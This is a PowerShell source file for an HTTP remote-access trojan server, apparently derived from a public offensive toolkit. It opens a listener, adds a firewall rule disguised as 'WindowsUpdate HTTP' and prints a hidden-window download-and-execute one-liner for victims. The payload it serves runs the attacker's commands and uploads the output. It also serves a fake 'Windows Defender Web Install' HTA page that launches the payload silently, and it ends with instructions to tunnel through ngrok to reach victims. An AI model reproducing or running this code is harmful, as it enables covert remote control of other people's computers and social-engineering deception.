function HttpRatServer
{ 
<#On the target machine execute the below command from PowerShell:
iex((New-Object Net.WebClient).DownloadString("http://ListenerIPAddress/connect"))
The script has been originally written by Casey Smith (@subTee)
.EXAMPLE
PS > HttpRatServer -IPAddress 127.0.0.1 -Port 8080

Above shows an example where the listener starts on port 8080. On the client execute:
iex((New-Object Net.WebClient).DownloadString("http://192.168.254.1/connect"))
#>     
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int]
        $Port
    )

    function Receive-Request 
    {
       param(      
          $Request
       )
       $output = ""
       $size = $Request.ContentLength64 + 1   
       $buffer = New-Object byte[] $size
       do 
       {
          $count = $Request.InputStream.Read($buffer, 0, $size)
          $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
       } until($count -lt $size)
       $Request.InputStream.Close()
       write-host $output
    }
    try
    {
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://+:$Port/")
       #Create Firewall Rules
        netsh advfirewall firewall delete rule name="WindowsUpdate HTTP" | Out-Null
        netsh advfirewall firewall add rule name="WindowsUpdate HTTP" dir=in action=allow protocol=TCP localport=$Port | Out-Null
        $listener.Start()
        Write-Output "Listening on $IPAddress`:$Port"
        Write-Output "Run the following command on the target:"
        Write-Output "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://$IPAddress`:$Port/connect'))"

        while ($true) 
        {
            $context = $listener.GetContext() # blocks until request is received
            $request = $context.Request
            $response = $context.Response
	        $hostip = $request.RemoteEndPoint
	        #Use this for One-Liner Start
	        if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
            {  

            $message = "
		            			
                            `$s = `"http://$IPAddress`:$Port/rat`"
					        `$w = New-Object Net.WebClient 
					        while(`$true)
					        {
					        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
					        `$r = `$w.DownloadString(`$s)
					        while(`$r) {
						        `$o = invoke-expression `$r | out-string 
						        `$w.UploadString(`$s, `$o)	
						        break
					        }
					        }
		        "
            }		 
	
	        if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") )
            { 
		        Receive-Request($request)	
	        }
            if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) 
            {  
                $response.ContentType = 'text/plain'
                $message = Read-Host "PS $hostip>"		
                #If the Server/Attacker uses the exit command. Close the client part and the server.
                if ($message -eq "exit")
                {
                    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
                    $response.ContentLength64 = $buffer.length
                    $output = $response.OutputStream
                    $output.Write($buffer, 0, $buffer.length)
                    $output.Close()
                    $listener.Stop()
                    break
                }
            }
            if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) 
            {
		        $enc = [system.Text.Encoding]::UTF8
		        $response.ContentType = 'application/hta'
		        $Htacode = @"
                <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                <html xmlns="http://www.w3.org/1999/xhtml">
                <head>
                <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
                <title>Windows Defender Web Install</title>
                <SCRIPT Language="VBScript">
                Sub Initialize()
                Set oShell = CreateObject("WScript.Shell")
                ps = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((new-object net.webclient).downloadstring('http://$IPAddress`:$Port/connect'))"
                oShell.run(ps),0,true
                End Sub
                </script>
                <hta:application
                   id="oHTA"
                   applicationname="Windows Defender Web Install"
                   application="yes"
                >
                </hta:application>
                </head>

                </SCRIPT>
                <div> 
                <body onload="Initialize()">
                <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
                </object></div>   
                </body>
                </html>
"@
		        $buffer = $enc.GetBytes($htacode)		
		        $response.ContentLength64 = $buffer.length
		        $output = $response.OutputStream
		        $output.Write($buffer, 0, $buffer.length)
		        $output.Close()
		        continue
	        }

            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
            $response.ContentLength64 = $buffer.length
            $output = $response.OutputStream
            $output.Write($buffer, 0, $buffer.length)
            $output.Close()
        }

        $listener.Stop()
    }
    catch
    {
        Write-Warning "Something went wrong! correct port." 
        Write-Error $_
    }
}
HttpRatServer -IPAddress 127.0.0.1 -Port 8080 
Write-Host 'Use --> ngrok.exe http 9090  and execute this to victim: iex((New-Object Net.WebClient).DownloadString("http://xxx.ngrok.io/connect")) OR  !httprat|xxxxxx.ngrok.io '